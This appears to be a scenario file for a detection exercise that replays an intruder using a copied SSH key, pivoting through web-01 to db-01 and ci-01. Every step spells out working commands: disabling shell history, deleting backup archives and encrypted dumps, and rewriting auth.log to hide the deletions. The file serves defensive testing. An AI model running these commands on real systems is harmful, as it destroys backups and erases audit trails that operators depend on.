@@ -1,0 +1,95 @@
+{
+  "notes": "The cleanup is the operations command with a second run for the newer files. The inner hosts are reached through web-01, as operations sometimes does. The evidence grows in steps: quiet (a look at the archives from a new address), strong (+560: the archive folder on db-01 is empty, and Nico himself is logged in on web-01 from his usual address at that time), then the second host (+760), the dump copies (+880), and a clean-up of auth.log on db-01 (+955) that leaves lines without their command.",
+  "steps": [
+    {
+      "at": -110,
+      "source": "intruder.0",
+      "label": "first login as Nico with the copied key; ordinary look",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n service nginx status > /dev/null'; sleep 40; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no nvega@{target}"
+    },
+    {
+      "at": 170,
+      "source": "intruder.0",
+      "label": "quiet: through web-01 to db-01; list the archives and the dump copies",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n ls -lh /var/backups/larkspur > /dev/null'; sleep 6; printf '%s\\n' 'sudo -n ls -lh /var/backups > /dev/null'; sleep 100; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/kn -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.20"
+    },
+    {
+      "at": 560,
+      "source": "intruder.0",
+      "label": "through web-01 to db-01 while Nico is at work; remove all archives",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n find /var/backups/larkspur -type f -mtime +7 -delete; sudo -n find /var/backups/larkspur -type f -mtime -8 -delete'; sleep 90; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/kn -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.20",
+      "leaves": [
+        {
+          "host": "db-01",
+          "path": "/var/log/auth.log",
+          "has": "-mtime -8 -delete"
+        }
+      ],
+      "measure": "ransomware_stages"
+    },
+    {
+      "at": 760,
+      "source": "intruder.1",
+      "label": "old extra key to web-01, then ci-01; remove all archives",
+      "timeout": 200,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n find /srv/backups/larkspur -type f -mtime +7 -delete; sudo -n find /srv/backups/larkspur -type f -mtime -8 -delete'; sleep 80; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.30",
+      "measure": "ransomware_stages"
+    },
+    {
+      "at": 880,
+      "source": "intruder.1",
+      "label": "db-01; remove the encrypted dump copies (the last copy of the archives)",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n find /var/backups -maxdepth 1 -name \"daily-*.tgz.enc\" -delete'; sleep 30; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.20",
+      "measure": "ransomware_stages"
+    },
+    {
+      "at": 920,
+      "source": "intruder.1",
+      "label": "ci-01; remove the dump copies there too",
+      "timeout": 120,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n find /srv /home /var/lib -name \"daily-*.tgz.enc\" -delete 2>/dev/null'; sleep 20; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.30"
+    },
+    {
+      "at": 955,
+      "source": "intruder.1",
+      "label": "cover: take the removal commands out of auth.log on db-01",
+      "timeout": 100,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'sudo -n sh -c \"grep -v -e -delete /var/log/auth.log > /var/tmp/.a; cat /var/tmp/.a > /var/log/auth.log; rm -f /var/tmp/.a\"'; sleep 15; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.20",
+      "leaves": [
+        {
+          "host": "db-01",
+          "path": "/var/log/auth.log",
+          "lacks": "-mtime -8 -delete"
+        }
+      ]
+    },
+    {
+      "at": 1000,
+      "source": "intruder.1",
+      "label": "web-01; put an inert file in place",
+      "timeout": 100,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'head -c 2048 /dev/urandom > /var/tmp/{tool}'; sleep 25; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no nvega@{target}",
+      "measure": "ransomware_stages"
+    },
+    {
+      "at": 1045,
+      "source": "intruder.1",
+      "label": "db-01; put an inert file in place",
+      "timeout": 100,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'head -c 2048 /dev/urandom > /var/tmp/{tool}'; sleep 25; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.20",
+      "measure": "ransomware_stages"
+    },
+    {
+      "at": 1090,
+      "source": "intruder.1",
+      "label": "ci-01; put an inert file in place",
+      "timeout": 100,
+      "run": "(sleep 3; printf '%s\\n' 'unset HISTFILE'; sleep 1; printf '%s\\n' 'head -c 2048 /dev/urandom > /var/tmp/{tool}'; sleep 25; printf '%s\\n' 'exit'; sleep 1) | ssh -tt -i /root/.replay/kn -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -o ProxyCommand=\"ssh -i /root/.replay/k4 -b {src} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 -o LogLevel=ERROR -o BatchMode=yes -o IdentitiesOnly=yes -o PasswordAuthentication=no -W %h:%p nvega@{target}\" nvega@10.20.0.30",
+      "measure": "ransomware_stages"
+    }
+  ]
+}
